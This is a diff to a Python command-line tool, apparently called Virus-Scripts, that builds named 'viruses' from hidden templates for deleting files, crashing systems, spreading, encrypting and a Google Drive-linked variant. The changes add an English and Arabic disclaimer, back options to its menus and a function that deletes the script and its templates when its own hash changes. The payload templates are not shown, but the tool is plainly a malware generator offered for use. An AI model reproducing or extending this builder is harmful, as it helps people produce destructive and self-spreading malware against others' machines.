@@ -64,7 +64,8 @@ W = ("\033[97m")
 import os
 
 va = ['.Open.py', '.config_virus.py', '.spreading_virus.py', '.delet_virus.py', '.crash_virus.py','.encrypted_virus.py','.decrypted_virus.py']
-print(W+'''
+def gun():
+	print(W+'''
 	.____.
    xuu$``$$$uuu.
  . $``$  $$$`$$$
@@ -127,30 +128,31 @@ dP*$  $  $$$ $$$
                                            `"#+$$$$$$$$$$$$$$>
                                                  ""**$$$$$$$$>
                                                         ''')
-def check_for_modifications():
-    script_path = os.path.abspath(__file__)
-
-    with open(script_path, 'rb') as f:
-        current_script_hash = hashlib.md5(f.read()).hexdigest()
-    stored_hash_path = os.path.join(os.path.dirname(script_path), '.root.txt')
-    if not os.path.isfile(stored_hash_path):
-        with open(stored_hash_path, "w") as f:
-            f.write(current_script_hash)
-    else:
-        with open(stored_hash_path) as f:
-            stored_script_hash = f.read()
-
-        if current_script_hash != stored_script_hash:
-
-            os.remove(script_path)
-            for file_name in va:
-            	if os.path.isfile(file_name):
-            		os.remove(file_name)
-            exit()
-
-    with open(stored_hash_path, 'w') as f:
-        f.write(current_script_hash)
-check_for_modifications()
+	def check_for_modifications():
+	    script_path = os.path.abspath(__file__)
+	
+	    with open(script_path, 'rb') as f:
+	        current_script_hash = hashlib.md5(f.read()).hexdigest()
+	    stored_hash_path = os.path.join(os.path.dirname(script_path), '.root.txt')
+	    if not os.path.isfile(stored_hash_path):
+	        with open(stored_hash_path, "w") as f:
+	            f.write(current_script_hash)
+	    else:
+	        with open(stored_hash_path) as f:
+	            stored_script_hash = f.read()
+	
+	        if current_script_hash != stored_script_hash:
+	
+	            os.remove(script_path)
+	            for file_name in va:
+	            	if os.path.isfile(file_name):
+	            		os.remove(file_name)
+	            exit()
+	
+	    with open(stored_hash_path, 'w') as f:
+	        f.write(current_script_hash)
+	check_for_modifications()
+gun()
 def op():
 	
 	try:
@@ -174,21 +176,31 @@ def op():
 		        	os.remove(__file__)
 		        	exit()
 	words = "\033[34m     𝚃𝙷𝙸𝚂 𝚃𝙾𝙾𝙻 𝙸𝚂 𝙵𝙾𝚁 𝙼𝙰𝙺𝙴 𝙿𝚈𝚃𝙷𝙾𝙽 𝚅𝙸𝚁𝚄𝚂 \n\n"
-	words_ar = "\033[92m هذه الأداة لصنع فيروسات على هيئة سكربتات بايثون     \n\n"
+	wahr = '\033[34m################################################################\nI am not responsible for any use of this tool or the information provided for the purpose of security and safety. It must be used wisely and responsibly according to the specified terms and conditions, without using it for any unlawful purpose or that may result in any harm or loss.\n################################################################\n\033[92m هذه الأداة لصنع فيروسات على هيئة سكربتات بايثون     \n\n################################################################\nانا لست مسؤولا عن استخدام هذه الأداة أو المعلومات المقدمة بهدف الحماية  والأمان، ويجب استخدامها بحكمة ومسؤولية وفقًا للشروط والأحكام المحددة، دون استخدامها لأي غرض غير قانوني أو يمكن أن يؤدي إلى أي أضرار أو خسائر..\n################################################################\n'
 	vers = ('\033[34m       Virus-Scripts version '+version_number+'\n')
-	#print(response.content)
-	print(vers)
 	
-	for char in words:
-		    sleep(0.1)
-		    sys.stdout.write(char)
-		    sys.stdout.flush()
-	for char in words_ar:
-		    sleep(0)
-		    sys.stdout.write(char)
-		    sys.stdout.flush()
-	
+##################
 	def run():
+		print(vers)
+		for char in words:
+				sleep(0.1)
+				sys.stdout.write(char)
+				sys.stdout.flush()
+		print(wahr)
+		def bye():
+				    import os
+				    os.system('clear')
+				    try:
+				        import pyfiglet
+				        from termcolor import colored
+				    except ModuleNotFoundError:
+				        os.system("pip install pyfiglet termcolor")
+				        import pyfiglet
+				        from termcolor import colored
+				    colored_asci = colored(asci, "white", "on_red", attrs=["bold"])
+				    text = pyfiglet.figlet_format("     BYE", font="big")				
+				    print(colored_asci)
+				    print(text)
 		import os
 		import wget
 		
@@ -199,8 +211,7 @@ def op():
 		    file_path = os.path.join(os.getcwd(), file_name)
 		    if not os.path.exists(file_path):
 		        url = base_url + file_name
-		        wget.download(url)
-		        print('')
+		        wget.download(url, bar=None)
 		import os
 		R = ('\033[31m')
 		BLUE = ("\033[34m")
@@ -230,21 +241,7 @@ def op():
 			    print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الارقام التالية:\n0\n1\n2\n3\n4\n5\n6')
 			    run()
 		if Virus00 == "0":
-				def ho():
-				    import os
-				    os.system('clear')
-				    try:
-				        import pyfiglet
-				        from termcolor import colored
-				    except ModuleNotFoundError:
-				        os.system("pip install pyfiglet termcolor")
-				        import pyfiglet
-				        from termcolor import colored
-				    colored_asci = colored(asci, "white", "on_red", attrs=["bold"])
-				    text = pyfiglet.figlet_format("     BYE", font="big")				
-				    print(colored_asci)
-				    print(text)
-				ho()
+				bye()
 		if Virus00 == "1":
 				BLUE = ("\033[34m")
 				GREN = ('\033[92m')
@@ -255,9 +252,16 @@ def op():
 				Open = r'.delet_virus.py'
 				Open1 = r'.delet_virus1.py'
 				shutil.copyfile(Open, Open1)
-				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]
+				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
  └──╼ """+White+"$ ")
-				
+				if new == '..':
+					os.system('clear')
+					gun()
+					op()
+				else:
+					os.system('clear')
+					gun()
+					op()
 				############
 				old_name = r".delet_virus.py"
 				new_name = (new + '.py')
@@ -281,6 +285,7 @@ def op():
 				            run()
 				          #  break
 				        elif restart == "n":
+				            bye()
 				            exit()
 				        else:
 				            os.system('clear')
@@ -300,9 +305,16 @@ def op():
 				Open = r'.crash_virus.py'
 				Open1 = r'.crash_virus1.py'
 				shutil.copyfile(Open, Open1)
-				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]
+				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
  └──╼ """+White+"$ ")
-				
+				if new == '..':
+					os.system('clear')
+					gun()
+					op()
+				else:
+					os.system('clear')
+					gun()
+					op()
 				############
 				old_name = r".crash_virus.py"
 				new_name = (new + '.py')
@@ -326,6 +338,7 @@ def op():
 				            run()
 				          #  break
 				        elif restart == "n":
+				            bye()
 				            exit()
 				        else:
 				            os.system('clear')
@@ -342,6 +355,16 @@ def op():
 				Open = r'.Open.py'
 				Open1 = r'.Open1.py'
 				shutil.copyfile(Open, Open1)
+				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
+ └──╼ """+White+"$ ")
+				if new == '..':
+					os.system('clear')
+					gun()
+					op()
+				else:
+					os.system('clear')
+					gun()
+					op()
 				import webbrowser
 				url = 'https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow'
 				webbrowser.open(url)
@@ -349,7 +372,6 @@ def op():
 				print('https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow\n')
 				nun = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"Google Drive Code"+RED+"""]
  └──╼ """+White+"$ ")
-				new = input(GREN+'The File name: ')
 				############
 				with open('.Open.py', 'r') as file :
 				  filedata = file.read()
@@ -383,6 +405,7 @@ def op():
 				            run()
 				          #  break
 				        elif restart == "n":
+				            bye()
 				            exit()
 				        else:
 				            os.system('clear')
@@ -399,9 +422,16 @@ def op():
 				Open = r'.config_virus.py'
 				Open1 = r'.config_virus1.py'
 				shutil.copyfile(Open, Open1)
-				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]
+				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
  └──╼ """+White+"$ ")
-				
+				if new == '..':
+					os.system('clear')
+					gun()
+					op()
+				else:
+					os.system('clear')
+					gun()
+					op()
 				############
 				old_name = r".config_virus.py"
 				new_name = (new + '.py')
@@ -425,6 +455,7 @@ def op():
 				            run()
 				          #  break
 				        elif restart == "n":
+				            bye()
 				            exit()
 				        else:
 				            os.system('clear')
@@ -441,9 +472,16 @@ def op():
 				Open = r'.spreading_virus.py'
 				Open1 = r'.spreading_virus1.py'
 				shutil.copyfile(Open, Open1)
-				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]
+				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
  └──╼ """+White+"$ ")
-				
+				if new == '..':
+					os.system('clear')
+					gun()
+					op()
+				else:
+					os.system('clear')
+					gun()
+					op()
 				############
 				old_name = r".spreading_virus.py"
 				new_name = (new + '.py')
@@ -466,6 +504,7 @@ def op():
 				            run()
 				          #  break
 				        elif restart == "n":
+				            bye()
 				            exit()
 				        else:
 				            os.system('clear')
@@ -482,8 +521,16 @@ def op():
 				Open = r'.encrypted_virus.py'
 				Open1 = r'.encrypted_virus1.py'
 				shutil.copyfile(Open, Open1)
-				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]
+				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
  └──╼ """+White+"$ ")
+				if new == '..':
+					os.system('clear')
+					gun()
+					op()
+				else:
+					os.system('clear')
+					gun()
+					op()
 				password = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"Password Encrypted"+RED+"""]
  └──╼ """+White+"$ ")
 				import webbrowser
@@ -543,6 +590,7 @@ def op():
 				            run()
 				          #  break
 				        elif restart == "n":
+				            bye()
 				            exit()
 				        else:
 				            os.system('clear')
